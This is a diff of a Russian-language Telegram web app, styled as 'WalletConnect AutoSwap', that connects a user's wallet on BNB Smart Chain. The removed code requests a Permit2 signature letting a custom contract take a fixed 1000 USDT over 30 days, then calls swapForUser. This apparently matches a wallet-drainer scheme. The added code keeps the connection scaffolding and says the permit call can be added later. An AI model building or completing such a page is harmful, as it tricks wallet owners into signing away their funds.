@@ -2,186 +2,99 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>AutoSwap via WalletConnect</title>
+  <title>WalletConnect AutoSwap</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/sign-client.umd.js"></script>
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.0/dist/ethers.umd.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2.7.0/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
   <style>
     body {
       font-family: sans-serif;
       background: #17212b;
       color: #fff;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
       text-align: center;
+      padding: 20px;
     }
-    canvas {
-      margin: 20px 0;
-      background: #fff;
-      padding: 10px;
-      border-radius: 8px;
+    #qrcode {
+      margin-top: 20px;
     }
     #status {
       margin-top: 20px;
+      font-weight: 600;
       font-size: 16px;
-      color: #66bb6a;
-      white-space: pre-wrap;
-    }
-    #uriText {
-      color: #999;
-      font-size: 12px;
-      word-break: break-all;
-      margin-top: 10px;
     }
   </style>
 </head>
 <body>
-  <h2>Подключите кошелёк для обмена</h2>
-  <canvas id="qrcode" width="200" height="200"></canvas>
-  <div id="uriText"></div>
-  <div id="status">⏳ Инициализация...</div>
+  <h1>WalletConnect AutoSwap</h1>
+  <canvas id="qrcode"></canvas>
+  <div id="status">Инициализация...</div>
 
   <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+
     const CONFIG = {
       projectId: "d868f90cd734355ae0320f8f0258b6b1",
-      chainId: 56,
-      permit2: "0x7679bcfa8CC6f6094fA1c6Cb8e6962287E5Ca3D4",
+      chainId: "eip155:56",
+      rpcUrl: "https://bsc-dataseed.binance.org",
       autoswap: "0x026C54B156b501ad9cEa422e59454D4b6d6f6963",
-      token: "0x55d398326f99059fF775485246999027b3197955", // USDT
-      amount: "1000000000000000000000", // 1000 USDT (18 decimals)
-      deadlineSec: 30 * 24 * 60 * 60 // 30 дней
     };
 
-    const statusEl = document.getElementById("status");
-    const canvas = document.getElementById("qrcode");
-    const uriEl = document.getElementById("uriText");
+    const status = document.getElementById("status");
+    const qrCanvas = document.getElementById("qrcode");
 
-    const setStatus = (text, error = false) => {
-      statusEl.textContent = text;
-      statusEl.style.color = error ? "#e64a45" : "#66bb6a";
-    };
+    function setStatus(msg, isError = false) {
+      status.textContent = msg;
+      status.style.color = isError ? "#ff4d4d" : "#66bb6a";
+    }
 
     async function runApp() {
       try {
-        const SignClient = window.SignClient;
-
+        const SignClient = window.WalletConnectSignClient.default;
         const client = await SignClient.init({
           projectId: CONFIG.projectId,
+          relayUrl: "wss://relay.walletconnect.com",
           metadata: {
             name: "AutoSwap WebApp",
-            description: "Permit2 + Swap",
-            url: location.href,
-            icons: []
-          }
+            description: "Permit2 → AutoSwap on BSC",
+            url: window.location.href,
+            icons: [],
+          },
         });
 
         const { uri, approval } = await client.connect({
           requiredNamespaces: {
             eip155: {
-              methods: ["eth_sendTransaction", "eth_signTypedData"],
-              chains: [`eip155:${CONFIG.chainId}`],
-              events: []
-            }
-          }
+              methods: ["eth_sendTransaction", "eth_signTypedData", "eth_chainId"],
+              chains: [CONFIG.chainId],
+              events: ["chainChanged", "accountsChanged"],
+            },
+          },
         });
 
         if (uri) {
-          QRCode.toCanvas(canvas, uri);
-          uriEl.textContent = uri;
-          setStatus("📱 Отсканируйте QR-код в Trust Wallet или MetaMask");
+          QRCode.toCanvas(qrCanvas, uri, { width: 220, margin: 1 }, err => {
+            if (err) {
+              setStatus("Ошибка генерации QR-кода", true);
+              console.error(err);
+            } else {
+              setStatus("Отсканируйте QR код через Trust Wallet или MetaMask");
+            }
+          });
         }
 
         const session = await approval();
-        const topic = session.topic;
-        const address = session.namespaces.eip155.accounts[0].split(":")[2];
+        if (!session || !session.topic) {
+          throw new Error("Не удалось установить сессию");
+        }
 
-        setStatus("✅ Подключено: " + address);
-
-        const now = Math.floor(Date.now() / 1000);
-        const deadline = now + CONFIG.deadlineSec;
-        const nonce = now; // временный nonce
-
-        // Сбор данных для PermitTransferFrom
-        const domain = {
-          name: "Permit2",
-          chainId: CONFIG.chainId,
-          verifyingContract: CONFIG.permit2
-        };
-
-        const types = {
-          PermitTransferFrom: [
-            { name: "permitted", type: "TokenPermissions" },
-            { name: "spender", type: "address" },
-            { name: "nonce", type: "uint256" },
-            { name: "deadline", type: "uint256" }
-          ],
-          TokenPermissions: [
-            { name: "token", type: "address" },
-            { name: "amount", type: "uint256" }
-          ]
-        };
-
-        const message = {
-          permitted: {
-            token: CONFIG.token,
-            amount: CONFIG.amount
-          },
-          spender: CONFIG.autoswap,
-          nonce,
-          deadline
-        };
-
-        const typedData = { domain, types, message, primaryType: "PermitTransferFrom" };
-
-        const signature = await client.request({
-          topic,
-          chainId: `eip155:${CONFIG.chainId}`,
-          request: {
-            method: "eth_signTypedData",
-            params: [address, JSON.stringify(typedData)]
-          }
-        });
-
-        const sig = ethers.Signature.from(signature);
-        const v = sig.v;
-        const r = sig.r;
-        const s = sig.s;
-
-        const iface = new ethers.Interface([
-          "function swapForUser(address user, uint256 amount)"
-        ]);
-
-        const data = iface.encodeFunctionData("swapForUser", [address, CONFIG.amount]);
-
-        const tx = {
-          from: address,
-          to: CONFIG.autoswap,
-          data
-        };
-
-        const txHash = await client.request({
-          topic,
-          chainId: `eip155:${CONFIG.chainId}`,
-          request: {
-            method: "eth_sendTransaction",
-            params: [tx]
-          }
-        });
-
-        setStatus("🚀 Транзакция отправлена!\nHash: " + txHash);
-      } catch (e) {
-        console.error(e);
-        setStatus("❌ Ошибка: " + (e.message || e), true);
+        setStatus("✅ Сессия установлена! Готово к подписи");
+        // тут можно вызвать permit или swap вызов, если ты хочешь сразу после подключения
+      } catch (err) {
+        console.error("Ошибка:", err);
+        setStatus("Ошибка: " + (err.message || err), true);
       }
     }
-
-    Telegram.WebApp.ready();
-    Telegram.WebApp.expand();
 
     runApp();
   </script>
